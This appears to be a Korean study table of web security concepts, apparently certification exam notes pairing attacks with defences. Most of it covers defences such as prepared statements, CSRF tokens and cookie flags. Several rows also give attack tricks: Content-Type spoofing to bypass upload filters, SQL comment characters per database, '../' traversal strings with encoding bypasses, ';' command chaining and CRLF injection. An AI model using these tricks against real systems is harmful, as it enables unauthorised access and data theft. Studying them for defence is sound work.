| SQL Injection 방어 | PreparedStatement + ? 플레이스홀더 → SQL과 데이터 분리 |
| CSRF 방어 | CSRF 토큰(매 요청마다 새로 발급) + 세션 토큰 비교 + POST 방식 |
| SSRF 필터링 | 화이트리스트(기본) → 블랙리스트(무작위 입력 시) |
| 파일 업로드 우회 | Content-Type 헤더를 image/gif 등으로 변조 |
| 파일 업로드 대응 | 확장자 화이트리스트 + 실행 권한 제거 + 웹루트 외부 저장 |
| SQLi DB별 주석문자 | MySQL=# / MS-SQL·Oracle=-- (여러줄은 공통 `/* */`) |
| SQLi 무료 스캐너 | Nikto(웹서버 전반) / SQLMap(블라인드 자동화) / Absinthe(GUI) |
| CSRF vs SSRF | 조작 요청 발생 주체 — CSRF=사용자(클라이언트) / SSRF=웹서버 |
| 파일 다운로드 취약점 | 경로 파라미터 조작(../, ..\\)으로 임의 파일 다운로드 |
| LFI vs RFI | Local(로컬 서버 파일) vs Remote(원격지 파일), PHP include/require |
| OS Command Injection | `;`로 명령어 연결 삽입, system()/exec() 필터링 미흡 |
| 위치공개 취약점 | 백업·로그·압축파일 노출 → Apache Files/FilesMatch 지시자로 확장자 차단 |
| 쿠키 보안 3속성 | HttpOnly(JS 차단) / Secure(HTTPS만) / SameSite(CSRF 방지) |
| HTTP Request Smuggling | Content-Length vs Transfer-Encoding 불일치 악용 |
| HTTP 응답 분할 | CR(%0D) + LF(%0A) 삽입 |
| 디렉터리 리스팅 차단 | Apache: Options 지시자에서 Indexes 삭제 |
| 퍼징(Fuzzing) | 무작위 데이터 입력 → 오류·취약점 발견 |
| 경로추적 조작 문자 | `../`(유닉스), `..\`(윈도우) + URL/더블URL/유니코드 인코딩 우회 |
| URL/파라미터 변조 | 클라이언트 값을 신뢰하지 않고 서버측 세션 기반 재검증 |
| 불충분한 세션관리 | 예측 가능한 세션ID·긴 타임아웃 → 세션 하이재킹 |
| 정보누출 | 디폴트 에러페이지·에러메시지로 시스템 정보 노출 |
| 관리자페이지 노출 대응 | URL 추측 어렵게 변경 + 2 Factor/2 Channel 인증 |
| 웹 로그 종류 | access log(요청) / error log(오류) / NCSA CLF·ELF 포맷 |
| 보안서버 구축 | 기존 웹서버에 SSL/TLS 설치(HTTPS), 암호화 대상="고유식별정보/비밀번호/생체인식정보" |
